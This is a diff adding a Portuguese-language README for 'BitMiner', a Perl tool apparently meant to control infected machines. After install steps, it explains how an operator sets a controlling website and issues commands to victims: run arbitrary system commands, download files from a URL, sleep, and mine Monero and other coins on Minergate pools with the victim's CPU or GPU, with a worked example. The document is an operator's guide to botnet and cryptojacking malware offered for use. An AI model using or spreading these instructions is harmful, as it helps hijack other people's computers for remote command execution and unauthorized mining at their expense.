@@ -1,0 +1,56 @@
+1 - Windows ou Linux ?
+
+Se você estiver no Windows, instale o StrawBerry Perl:
+32bits - http://strawberryperl.com/download/5.26.0.2/strawberry-perl-5.26.0.2-32bit.msi
+64bits - http://strawberryperl.com/download/5.26.0.2/strawberry-perl-5.26.0.2-64bit.msi
+
+2 - Módulos (Bibliotecas necessárias)
+
+Necessário ter o gcc instalado
+Em seu terminal (cmd, ou seja lá o que for), execute estes comandos, lembrando que é
+necessário ter o Perl instalado (obviamente):
+cpan install Term::ANSIColor
+cpan install LWP::UserAgent
+cpan install LWP::Simple
+cpan install pp
+
+3 - Utilizando o BitMiner 
+
+Depois de ter feito isso, quando você executar o programa, ele perguntará qual o endereço do website controlador,
+o que seria isso ? O website controlador é aonde você sinalizará os comandos para as máquinas infectadas, agora
+vou mostrar uma lista de comandos disponíveis:
+
+stop:3; - Dorme por 3 segundos, lembrando que o número ' 3 ' pode ser editado (obviamente)
+
+exec:comando_do_sistema; - Executa um comando no sistema, lembrando que você não saberá a saída
+
+get:URL_DO_ARQUIVO;name:NOME_QUE_O_ARQUIVO_RECEBERÁ; - Baixa o arquivo da URL (URL_DO_ARQUIVO) e nomeia o arquivo como
+NOME_QUE_O_ARQUIVO_RECEBERÁ
+
+miner->host:HOST_MINERGATE;email:SEU_EMAIL_DA_MINERGATE; - Será explicado em seguida
+
+Para utilizá-lo, é necessário ter uma conta do Minergate (https://minergate.com/login), já que o programa utiliza o serviço
+da Minergate para minerar, em seguida, você deve escolher um desses hosts, que no caso é a pool em que o BitMiner deve minerar:
+
+BCN bcn.pool.minergate.com:45550
+XMR xmr.pool.minergate.com:45560
+QCN qcn.pool.minergate.com:45570
+XDN xdn.pool.minergate.com:45620	
+FCN fcn.pool.minergate.com:45610	
+MCN mcn.pool.minergate.com:45640
+DSH dsh.pool.minergate.com:45720
+INF8 inf8.pool.minergate.com:45750
+XDN+XMR	xdn-xmr.pool.minergate.com:45790
+FCN+XMR	fcn-xmr.pool.minergate.com:45590
+FCN+QCN	fcn-qcn.pool.minergate.com:45600
+FCN+DSH	fcn-dsh.pool.minergate.com:45730
+FCN+INF8 fcn-inf8.pool.minergate.com:45760
+MCN+QCN	mcn-qcn.pool.minergate.com:45670	
+MCN+DSH	mcn-dsh.pool.minergate.com:45740
+MCN+INF8 mcn-inf8.pool.minergate.com:45770
+
+Agora deve ter ficado mais claro para você, então digamos que eu queria minerar Monero (XMR) para o email joaozinho123@hotmail.com,
+seria utilizado isso: miner->host:xmr.pool.minergate.com:45560;email:joaozinho123@hotmail.com;
+
+Nota: O BitMiner também pergunta se a máquina alvo irá minerar utilizando a CPU ou GPU, no caso, você especificará na
+execução dele.
